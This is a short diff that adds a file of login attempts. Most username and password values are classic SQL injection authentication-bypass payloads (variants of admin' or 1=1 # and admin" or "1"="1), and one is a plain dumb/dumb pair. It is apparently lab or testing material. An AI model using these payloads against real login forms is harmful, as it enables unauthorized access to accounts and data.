@@ -1,0 +1,10 @@
+User Name:admin' or 1=1 #
+Password:asdasd
+User Name:admin" or 1=1 #
+Password:asdasd
+User Name:admin' or 1=1 #
+Password:asd
+User Name:dumb
+Password:dumb
+User Name:admin" or "1"="1
+Password:admin" or "1"="1
